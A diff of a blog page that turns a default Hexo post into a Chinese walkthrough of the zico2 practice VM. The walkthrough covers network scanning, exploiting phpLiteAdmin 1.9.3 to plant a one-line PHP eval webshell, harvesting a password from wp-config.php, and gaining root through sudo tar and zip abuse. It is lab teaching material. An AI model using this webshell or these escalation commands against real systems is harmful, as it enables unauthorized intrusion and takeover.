@@ -13,22 +13,42 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="http://hongmengshikong.github.io/2024/10/18/hello-world/"/>
+    <link rel="canonical" href="http://hongmengshikong.github.io/2024/10/19/入门靶机渗透之zico2/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="Welcome to Hexo ! This is your very first post. Check documentation  for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting  or you can ask me on GitHub . Q">
+        <meta name="description" content="在VMware中导入该虚拟机，导入完成后配置网卡，确保与自己的攻击机在同一网段，然后开启虚拟机先查看本机所在ip地址 1ip addr   收集信息通过&#x3D;&#x3D;arp&#x3D;&#x3D;协议扫描局域网，又快又准，但是只能扫描局域网内的ip。 1arp-scan -l   发现靶机的IP地址为 &#96;192.168.119.218，然后用nmap对靶机进行详细地扫描。 1nm">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hello World">
-<meta property="og:url" content="http://hongmengshikong.github.io/2024/10/18/hello-world/index.html">
+<meta property="og:title" content="入门靶机渗透之zico2">
+<meta property="og:url" content="http://hongmengshikong.github.io/2024/10/19/%E5%85%A5%E9%97%A8%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8Bzico2/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="Welcome to Hexo ! This is your very first post. Check documentation  for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting  or you can ask me on GitHub . Q">
+<meta property="og:description" content="在VMware中导入该虚拟机，导入完成后配置网卡，确保与自己的攻击机在同一网段，然后开启虚拟机先查看本机所在ip地址 1ip addr   收集信息通过&#x3D;&#x3D;arp&#x3D;&#x3D;协议扫描局域网，又快又准，但是只能扫描局域网内的ip。 1arp-scan -l   发现靶机的IP地址为 &#96;192.168.119.218，然后用nmap对靶机进行详细地扫描。 1nm">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2024-10-18T12:18:13.111Z">
-<meta property="article:modified_time" content="2024-10-18T12:26:34.843Z">
+<meta property="og:image" content="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409070933068.png">
+<meta property="og:image" content="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409070935694.png">
+<meta property="og:image" content="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409070938209.png">
+<meta property="og:image" content="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409070940799.png">
+<meta property="og:image" content="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409070941180.png">
+<meta property="og:image" content="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409070942773.png">
+<meta property="og:image" content="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409070952966.png">
+<meta property="og:image" content="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409070953422.png">
+<meta property="og:image" content="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409070955168.png">
+<meta property="og:image" content="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409070956059.png">
+<meta property="og:image" content="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409070958248.png">
+<meta property="og:image" content="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409071000738.png">
+<meta property="og:image" content="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409071001009.png">
+<meta property="og:image" content="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409071003917.png">
+<meta property="og:image" content="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409071005222.png">
+<meta property="og:image" content="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409071014815.png">
+<meta property="og:image" content="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409071018000.png">
+<meta property="og:image" content="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409071014472.png">
+<meta property="og:image" content="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409071016911.png">
+<meta property="article:published_time" content="2024-10-19T12:00:34.068Z">
+<meta property="article:modified_time" content="2024-10-19T12:00:50.969Z">
 <meta property="article:author" content="shikong">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409070933068.png">
     
     
     <!--- Icon Part-->
@@ -40,7 +60,7 @@
     
     <title>
         
-            Hello World -
+            入门靶机渗透之zico2 -
         
         鸿蒙时空
     </title>
@@ -286,7 +306,7 @@
         <div class="article-title relative w-full">
             
                 <div class="w-full flex items-center pt-6 justify-start">
-                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">Hello World</h1>
+                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">入门靶机渗透之zico2</h1>
                 </div>
             
             </div>
@@ -307,15 +327,15 @@
                         <div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2024-10-18 20:18:13</span>
-        <span class="mobile">2024-10-18 20:18:13</span>
+        <span class="desktop">2024-10-19 20:34</span>
+        <span class="mobile">2024-10-19 20:34</span>
         <span class="hover-info">创建</span>
     </span>
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-10-18 20:26:34</span>
-            <span class="mobile">2024-10-18 20:26:34</span>
+            <span class="desktop">2024-10-19 20:50</span>
+            <span class="mobile">2024-10-19 20:50</span>
             <span class="hover-info">更新</span>
         </span>
     
@@ -326,12 +346,12 @@
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>75 字</span>
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>778 字</span>
         </span>
     
     
         <span class="article-min2read article-meta-item">
-            <i class="fa-regular fa-clock"></i>&nbsp;<span>1 分钟</span>
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>3 分钟</span>
         </span>
     
     
@@ -350,19 +370,170 @@
 
 
         <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-            <p>Welcome to <a class="link"   target="_blank" rel="noopener" href="https://hexo.io/" >Hexo <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>! This is your very first post. Check <a class="link"   target="_blank" rel="noopener" href="https://hexo.io/docs/" >documentation <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link"   target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html" >troubleshooting <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> or you can ask me on <a class="link"   target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues" >GitHub <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure></div>
+            <p>在VMware中导入该虚拟机，导入完成后配置网卡，确保与自己的攻击机在同一网段，然后开启虚拟机<br>先查看本机所在ip地址</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip addr</span><br></pre></td></tr></table></figure></div>
 
-<p>More info: <a class="link"   target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html" >Writing <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409070933068.png"
+                      alt="image-20240907093349987"
+                ></p>
+<h3 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h3><p>通过&#x3D;&#x3D;arp&#x3D;&#x3D;协议扫描局域网，又快又准，但是只能扫描局域网内的ip。</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure></div>
 
-<p>More info: <a class="link"   target="_blank" rel="noopener" href="https://hexo.io/docs/server.html" >Server <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409070935694.png"
+                      alt="image-20240907093511650"
+                ></p>
+<p>发现靶机的IP地址为 &#96;192.168.119.218，然后用nmap对靶机进行详细地扫描。</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -sV -p- --min-parallelism 100 192.168.56.140</span><br></pre></td></tr></table></figure></div>
 
-<p>More info: <a class="link"   target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html" >Generating <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure></div>
+<blockquote>
+<p>-A 代表综合性扫描，能收集很多重要的信息</p>
+<p>-sV 代表扫描主要的服务信息</p>
+<p>-p- 参数p是指定端口，后面的<code>-</code>代表所有端口。</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409070938209.png"
+                      alt="image-20240907093843150"
+                ></p>
+<p>靶机开放了80端口，111端口和53953端口。然后继续扫描目录。</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u 192.168.56.140</span><br></pre></td></tr></table></figure></div>
 
-<p>More info: <a class="link"   target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html" >Deployment <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409070940799.png"
+                      alt="image-20240907094041750"
+                ></p>
+<h3 id="获取SHELL"><a href="#获取SHELL" class="headerlink" title="获取SHELL"></a>获取SHELL</h3><p>目录扫描发现<code>dbadmin</code>目录，看名字应该是与数据库的管理有关，打开这个目录观察一下。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409070941180.png"
+                      alt="image-20240907094127127"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409070942773.png"
+                      alt="image-20240907094257728"
+                ></p>
+<p>发现了一个登陆页面，随便输入一个密码admin，就进了管理页面。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409070952966.png"
+                      alt="image-20240907095215906"
+                ></p>
+<p>1.9.3版本存在远程php代码注入漏洞，下面进行漏洞利用，写入webshell。首先随便创建一个数据库。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409070953422.png"
+                      alt="image-20240907095351355"
+                ></p>
+<p>然后在该库里创建一个表。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409070955168.png"
+                      alt="image-20240907095539116"
+                ></p>
+<p>随便设置一个字段名称，类型为<code>TEXT</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409070956059.png"
+                      alt="image-20240907095656006"
+                ></p>
+<p>在该表中写入一句话木马。</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;a&quot;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409070958248.png"
+                      alt="image-20240907095840178"
+                ></p>
+<p>此时还无法访问到该一句话木马，因为数据库文件的默认存放位置是 <code>/usr/databases/</code>，在该目录中的文件是无法直接访问到的，所以我们需要通过改名来移动文件到可以访问的位置。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409071000738.png"
+                      alt="image-20240907100035682"
+                ></p>
+<p>将原来的<code>/usr/databases/a</code>改为 <code>a.php</code>。此处不要使用<code>绝对路径</code>，需要使用<code>相对路径</code>。此处使用<code>相对路径</code>，数据库文件就会移动到当前管理页面的同级目录中，也就是 <code>/dbadmin/</code>中。</p>
+<p>访问 <code>http://192.168.56.140/dbadmin/</code>，发现a.php已经存在这个目录中了。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409071001009.png"
+                      alt="image-20240907100110955"
+                ></p>
+<p>然后通过蚁剑就可以连接到该一句话木马。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409071003917.png"
+                      alt="image-20240907100300401"
+                ></p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>获取shell尝试一下suid提权，没有成功。然后去查找靶机中有没有存在敏感信息。最终在家目录中wordpress中的配置文件<code>wp-config.php</code>中找到了<code>zico</code>账号和密码 <code>sWfCsfJSPV9H3AmQzw8</code>。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409071005222.png"
+                      alt="image-20240907100529161"
+                ></p>
+<p>尝试用ssh登陆，成功连接上了。</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh zico@192.168.56.140</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409071014815.png"
+                      alt="image-20240907101457771"
+                ></p>
+<p>尝试各种提权方法，最终发现可以通过sudo提权。可以通过具有root权限的tar和zip来提权。</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure></div>
+
+<p>通过tar提权：</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;/bin/bash&quot; &gt; shell.sh</span><br><span class="line">sudo tar cf archive.tar * --checkpoint=1 --checkpoint-action=exec=sh shell.sh</span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>–checkpoint&#x3D;n 每写入n个记录之后设置一个检查点（默认值为10）。</p>
+<p>–checkpoint-action&#x3D;cmd 在每个checkpoint（检查点）上执行cmd。</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409071018000.png"
+                      alt="image-20240907101839946"
+                ></p>
+<p>通过zip提权：</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">touch a</span><br><span class="line">sudo zip a.zip a -T --unzip-command=&quot;sh -c /bin/bash&quot;</span><br><span class="line">12</span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>-T –unzip-command&#x3D;cmd 代表在压缩文件后对压缩文件进行检测，检测文件时不是用系统标准的 <code>unzip -tqq</code>来检测，而是使用通过–unzip-command指定的<code>cmd</code>命令来检查文件。</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409071014472.png"
+                      alt="image-20240907101439426"
+                ></p>
+<p>读取flag！</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202409071016911.png"
+                      alt="image-20240907101646855"
+                ></p>
 
         </div>
 
@@ -370,18 +541,18 @@
             <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
                 <div class="article-copyright-info-container">
     <ul>
-        <li><strong>标题:</strong> Hello World</li>
+        <li><strong>标题:</strong> 入门靶机渗透之zico2</li>
         <li><strong>作者:</strong> 鸿蒙时空</li>
         <li><strong>创建于
-                :</strong> 2024-10-18 20:18:13</li>
+                :</strong> 2024-10-19 20:00:34</li>
         
             <li>
                 <strong>更新于
-                    :</strong> 2024-10-18 20:26:34
+                    :</strong> 2024-10-19 20:00:50
             </li>
         
         <li>
-            <strong>链接:</strong> https://hongmengshikong.github.io/2024/10/18/hello-world/
+            <strong>链接:</strong> https://hongmengshikong.github.io/2024/10/19/入门靶机渗透之zico2/
         </li>
         <li>
             <strong>
@@ -409,18 +580,33 @@
                     <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                         <a class="prev"
                         rel="prev"
-                        href="/2024/10/19/%E5%85%A5%E9%97%A8%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8Bzico2/"
+                        href="/2024/10/19/1-1.Iptables%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E5%86%85%E6%A0%B8%E9%85%8D%E7%BD%AE/"
                         >
                             <span class="left arrow-icon flex justify-center items-center">
                                 <i class="fa-solid fa-chevron-left"></i>
                             </span>
                             <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">入门靶机渗透之zico2</span>
+                                <span class="post-nav-title-item">Iptables的安装与内核配置</span>
                                 <span class="post-nav-item">上一篇</span>
                             </span>
                         </a>
                     </div>
                 
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/10/18/hello-world/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hello World</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
                 
             </div>
         
@@ -492,8 +678,8 @@
             <div class="post-toc-wrap">
     <div class="post-toc">
         <div class="toc-title">目录</div>
-        <div class="page-title">Hello World</div>
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Quick-Start"><span class="nav-text">Quick Start</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Create-a-new-post"><span class="nav-text">Create a new post</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Run-server"><span class="nav-text">Run server</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Generate-static-files"><span class="nav-text">Generate static files</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Deploy-to-remote-sites"><span class="nav-text">Deploy to remote sites</span></a></li></ol></li></ol>
+        <div class="page-title">入门靶机渗透之zico2</div>
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B6%E9%9B%86%E4%BF%A1%E6%81%AF"><span class="nav-text">收集信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96SHELL"><span class="nav-text">获取SHELL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">提权</span></a></li></ol>
 
     </div>
 </div>
